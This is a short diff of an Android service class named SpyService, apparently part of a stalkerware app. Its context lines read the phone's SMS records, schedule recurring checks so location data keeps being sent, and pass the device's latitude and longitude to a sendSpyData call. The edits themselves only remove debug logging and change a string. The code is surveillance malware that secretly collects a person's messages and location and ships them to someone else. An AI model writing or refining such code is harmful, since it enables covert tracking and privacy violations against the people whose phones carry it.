@@ -90,7 +90,6 @@ public class SpyService extends Service {
 								.toString();
 						String date = cursor.getString(cursor.getColumnIndexOrThrow("date"))
 								.toString();
-						Log.i(SetupActivity.TAG, "Date: " + date);
 
 						String protocol = cursor
 								.getString(cursor.getColumnIndexOrThrow("protocol"));
@@ -128,7 +127,6 @@ public class SpyService extends Service {
 			recurringCheck = PendingIntent.getService(getBaseContext(), 0, intervalIntent,
 					PendingIntent.FLAG_UPDATE_CURRENT);
 
-			Log.i(SetupActivity.TAG, "Intent: " + recurringCheck.toString());
 			// Only set the alarm if we haven't set it already.
 			// This prevents the condition of SMS received resetting our timer,
 			// and GPS data never getting sent
@@ -162,7 +160,7 @@ public class SpyService extends Service {
 					.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
 
 			if (networkLocation != null) {
-				String title = "Location Update:";
+				String title = "Location Update";
 				String body = networkLocation.getLatitude() + " " + networkLocation.getLongitude();
 				String date = "";
 				client.sendSpyData(title, body, date);
